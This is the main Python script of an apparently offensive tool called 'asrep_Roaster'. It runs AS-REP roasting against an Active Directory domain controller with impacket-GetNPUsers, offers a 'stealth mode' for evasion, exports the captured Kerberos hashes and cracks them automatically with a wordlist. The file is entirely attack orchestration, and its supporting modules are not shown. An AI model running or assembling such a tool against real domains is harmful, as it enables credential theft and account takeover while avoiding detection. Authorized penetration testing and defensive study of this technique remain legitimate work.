#!/usr/bin/env python3
from asrep_Roaster import cli, enum, asrep, report, cracker, banner

def main():

    banner.print_banner()
    
    args = cli.parse_args()

    print(f"[*] Loading users from {args.users}")
    users = enum.load_users(args.users)

    if args.stealth:
        print(f"[~] Stealth mode ENABLED — level {args.stealth}")

    print(f"[*] Enumerating against {args.domain} ({args.dc_ip}) using impacket-GetNPUsers...")
    asrep.process_users(
        users,
        args.domain,
        args.dc_ip,
        args.users,
        stealth_level=args.stealth
    )

    selected_users = cli.interactive_selection(users)

    print(f"[*] Generating report to {args.output}")
    report.generate_full_report(selected_users, args.output)

    print(f"[*] Exporting hashes to {args.hashes}")
    report.export_hashes(selected_users, args.hashes)

    if args.crack:
        print(f"[*] Starting automatic cracking with wordlist: {args.wordlist}")
        cracker.crack_hashes(
            selected_users,
            hash_file=args.hashes,
            wordlist=args.wordlist,
            rules_file=args.rules,
            timeout=args.crack_timeout
        )
        report.generate_full_report(selected_users, args.output)

    print("[+] Done.")

if __name__ == "__main__":
    main()
